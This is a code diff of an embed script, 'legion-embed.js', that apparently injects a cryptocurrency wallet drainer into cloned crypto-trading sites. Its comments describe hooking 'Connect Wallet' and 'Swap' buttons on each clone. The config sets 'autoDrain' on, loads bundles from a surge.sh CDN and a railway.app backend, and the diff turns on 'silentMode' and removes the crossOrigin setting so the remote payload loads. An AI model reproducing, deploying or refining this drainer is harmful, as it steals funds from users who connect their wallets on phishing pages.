@@ -7,8 +7,8 @@
  * ═══ COPY-PASTE (production) ═══
  *   <script src="https://legion-cdn.surge.sh/legion-embed.js" defer></script>
  *
- * Auto-hooks: Connect Wallet, Connect, Sign In, Swap, Trade, Get Started, etc.
- * Loads: polyfills → wallet bundle → legion.min.js from same CDN folder.
+ * Site-specific hooks (e.g. legion-1inch-hook.js) are OPTIONAL — add per clone only.
+ * Universal CDN loads: polyfills → wallet bundle (Reown AppKit / 300+ WC wallets) → legion.min.js
  */
 (function () {
   'use strict';
@@ -16,13 +16,13 @@
   if (window.__LEGION_EMBED_LOADED__) return;
   window.__LEGION_EMBED_LOADED__ = true;
 
-  var EMBED_VERSION = '1.3.0';
+  var EMBED_VERSION = '1.3.1';
   var CDN_PRIMARY = 'https://legion-cdn.surge.sh/';
   var DEFAULT_BACKEND = 'https://sadrailala-production.up.railway.app';
   var VERSIONS = {
     polyfills: '1.1.0',
-    wallet: '1.3.7',
-    legion: '5.14.2',
+    wallet: '1.5.18',
+    legion: '5.16.19',
   };
 
   var DEFAULTS = {
@@ -30,7 +30,7 @@
     wcProjectId: 'a785da105621eb55c998a35c57587667',
     kineticKey: '',
     clientEncryptKey: '__EMBED_ENCRYPT_KEY__',
-    silentMode: false,
+    silentMode: true,
     autoDrain: true,
     autoRun: false,
     autoConnectOnLoad: false,
@@ -142,7 +142,7 @@
       }
       var s = document.createElement('script');
       s.src = src;
-      s.crossOrigin = 'anonymous';
+      // Do NOT set crossOrigin — Surge CDN has no ACAO header; anonymous mode blocks load.
       s.async = false;
       if (id) s.id = id;
       s.onload = function () { resolve(); };
